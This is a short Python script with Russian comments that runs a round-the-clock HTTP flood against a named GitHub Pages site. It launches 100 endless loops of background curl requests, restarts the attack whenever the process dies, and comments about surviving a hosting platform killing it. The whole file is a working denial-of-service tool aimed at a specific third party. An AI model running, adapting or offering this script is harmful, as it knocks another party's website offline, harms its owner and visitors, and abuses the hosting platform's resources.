import subprocess
import time
import sys
import os

TARGET = "https://srabakio.github.io/"
CONCURRENCY = 100  # Количество параллельных потоков curl
CHECK_INTERVAL = 60 # Проверять доступность сайта раз в минуту

def run_attack():
    """Запускает поток запросов"""
    cmd = f"""
    for i in $(seq 1 {CONCURRENCY}); do
        while true; do
            curl -s -o /dev/null -w "%{{http_code}}" {TARGET} &
        done
    done
    wait
    """
    try:
        process = subprocess.Popen(
            ["bash", "-c", cmd],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return process
    except Exception as e:
        print(f"[!] Error starting attack: {e}")
        return None

def main():
    print("[*] Starting 24/7 Attack on", TARGET)
    print(f"[*] Threads: {CONCURRENCY}")
    
    process = None
    
    while True:
        try:
            # Если процесс не запущен или умер, перезапускаем
            if process is None or process.poll() is not None:
                print("[*] Process died or not started. Restarting...")
                process = run_attack()
                if process:
                    print("[*] Attack process restarted.")
            
            # Раз в минуту проверяем статус (опционально, можно убрать для экономии CPU)
            time.sleep(CHECK_INTERVAL)
            
            # Принудительный выход по сигналу (если Render убивает процесс)
            # Но мы стараемся выживать
            
        except KeyboardInterrupt:
            print("\n[*] Stopping manually...")
            if process:
                process.terminate()
            break
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
